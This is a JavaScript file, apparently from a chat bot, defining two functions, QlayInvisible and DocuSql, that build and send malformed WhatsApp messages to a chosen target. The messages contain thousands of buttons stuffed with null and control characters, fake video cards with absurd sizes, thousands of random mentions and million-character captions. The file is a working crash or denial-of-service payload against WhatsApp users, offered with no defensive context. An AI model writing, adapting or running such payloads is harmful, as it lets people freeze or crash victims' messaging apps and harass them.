async function QlayInvisible(sock, target) {
  const baten = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 1000; i++) {
    baten.push(
      { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\u0000".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\x10".repeat(5000) }) }
    );
  }

  const cardTemplate = {
    header: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
        fileLength: { low: 4194304, high: 2560, unsigned: true },
        seconds: 999999999,
        mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
        height: 9999,
        width: 9999,
        fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
        directPath:
          "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1751081957"
      },
      hasMediaAttachment: true,
    },
    body: {
      text: "𐌼𐌀CK3FELL𐌀𐍂",
    },
    nativeFlowMessage: {
      buttons: baten,
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "𐌼𐌀CK3FELL𐌀𐍂" },
            carouselMessage: {
              cards: Array(10).fill(cardTemplate),
              messageVersion: 1,
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 2000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }],
          },
        ],
      },
    ],
  });
}

async function DocuSql(sock, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      documentMessage: {
        document: Buffer.from("/x10".repeat(100000), "utf-8"),
        mimetype: "text/plain",
        fileName: "\n\n\n Snith Soft Boy ( Ara Soft Spoken )\n\n\n",
        caption: "/x10".repeat(1045000),
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_newsletter_description",
            buttonParamsJson: JSON.stringify({
              title: "StX",
              description: "Snith With Raa",
              sections: Array.from({ length: 1500 }, (_, i) => ({
                title: "\u0000".repeat(20000),
                rows: Array.from({ length: 2000 }, (_, j) => ({
                  title: `Item ${i * 20 + j + 1}`,
                  id: `${i * 20 + j + 1}`,
                })),
              })),
              listType: 2,
            }),
          },
          {
            name: "payment_transaction_request",
            buttonParamsJson: "/x10".repeat(9555),
          },
        ],
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
bot.launch()
